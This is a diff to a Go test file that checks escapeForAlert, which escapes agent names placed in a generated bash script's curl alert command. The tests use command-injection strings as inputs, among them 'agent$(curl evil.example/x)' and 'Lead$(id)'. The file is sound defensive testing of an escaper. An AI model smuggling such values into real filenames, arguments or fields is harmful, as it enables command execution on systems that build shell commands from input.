@@ -1,6 +1,7 @@
 package runner
 
 import (
+	"encoding/json"
 	"fmt"
 	"strings"
 	"testing"
@@ -139,6 +140,109 @@ func TestGenerate_PreservesUserKillPPID(t *testing.T) {
 
 	if c := strings.Count(out, "kill $PPID"); c != 1 {
 		t.Fatalf("expected exactly one kill $PPID, got %d in:\n%s", c, out)
+	}
+}
+
+// bashDequoteDouble emulates bash's double-quote removal: inside "...",
+// backslash is special only before $ ` " \ (and newline, which never appears
+// in escapeForAlert output — json.Marshal encodes control chars). Used to
+// replay the alert sink's decode chain — bash dequotes the -d argument, then
+// the chat API parses JSON.
+func bashDequoteDouble(s string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		if s[i] == '\\' && i+1 < len(s) && strings.ContainsRune("$`\"\\", rune(s[i+1])) {
+			b.WriteByte(s[i+1])
+			i++
+			continue
+		}
+		b.WriteByte(s[i])
+	}
+	return b.String()
+}
+
+func TestEscapeForAlert_RoundTripThroughSink(t *testing.T) {
+	names := []string{
+		"plain name",
+		`Lead "Architect"`,
+		"agent$(curl evil.example/x)",
+		"agent`id`",
+		`back\slash`,
+		`tail backslash\`,
+		"$HOME and ${SIZE}",
+		"all\\of\"it`together`$(now)$",
+		// Control chars are rejected at Load(), but the escaper must not
+		// depend on that: json.Marshal encodes them to escape sequences.
+		"line1\nline2\ttab",
+		"html <&> chars",
+		"unicode 日本 ⚠️",
+	}
+	for _, name := range names {
+		escaped := escapeForAlert(name)
+
+		// Safety: after escaping, bash must see no live $, ` or " — each must
+		// sit behind a backslash, or expansion / argument-termination fires.
+		for i := 0; i < len(escaped); i++ {
+			c := escaped[i]
+			if c == '\\' && i+1 < len(escaped) && strings.ContainsRune("$`\"\\", rune(escaped[i+1])) {
+				i++
+				continue
+			}
+			if c == '$' || c == '`' || c == '"' {
+				t.Errorf("name %q: live %q at offset %d in escaped form %q", name, string(c), i, escaped)
+			}
+		}
+
+		// Fidelity: replaying the sink (bash dequote, then JSON parse) must
+		// reproduce the original name exactly.
+		afterBash := bashDequoteDouble(escaped)
+		var decoded string
+		if err := json.Unmarshal([]byte(`"`+afterBash+`"`), &decoded); err != nil {
+			t.Errorf("name %q: invalid JSON after bash dequote (%q): %v", name, afterBash, err)
+			continue
+		}
+		if decoded != name {
+			t.Errorf("name %q: round-trip produced %q", name, decoded)
+		}
+	}
+}
+
+func TestGenerate_AlertCurlEscapesAgentName(t *testing.T) {
+	hostile := "Lead$(id) \"x\" `y` z\\w"
+	cfg := baseCfg("lead", config.AgentConfig{
+		Name:      hostile,
+		Model:     "claude-opus-4-7",
+		Iteration: "1m",
+		Prompt:    "do the thing",
+	})
+
+	out := Generate(cfg, "lead")
+
+	var alertLine string
+	for _, line := range strings.Split(out, "\n") {
+		if strings.Contains(line, "-d ") && strings.Contains(line, "content") {
+			alertLine = line
+			break
+		}
+	}
+	if alertLine == "" {
+		t.Fatalf("alert curl -d line not found in runner:\n%s", out)
+	}
+	// "Lead$(id)" only matches the unescaped form — the escaped line carries
+	// "Lead\$(id)", whose backslash breaks the substring.
+	if strings.Contains(alertLine, "Lead$(id)") {
+		t.Errorf("raw command substitution survives in alert line: %s", alertLine)
+	}
+	if strings.Contains(alertLine, "`y`") {
+		t.Errorf("raw backtick substitution survives in alert line: %s", alertLine)
+	}
+	if !strings.Contains(alertLine, escapeForAlert(hostile)) {
+		t.Errorf("escaped name missing from alert line: %s", alertLine)
+	}
+	// The static message text still relies on runtime expansion of ${SIZE} —
+	// escaping must apply to the name only.
+	if !strings.Contains(alertLine, "${SIZE}") {
+		t.Errorf("runtime ${SIZE} expansion lost from alert line: %s", alertLine)
 	}
 }
 
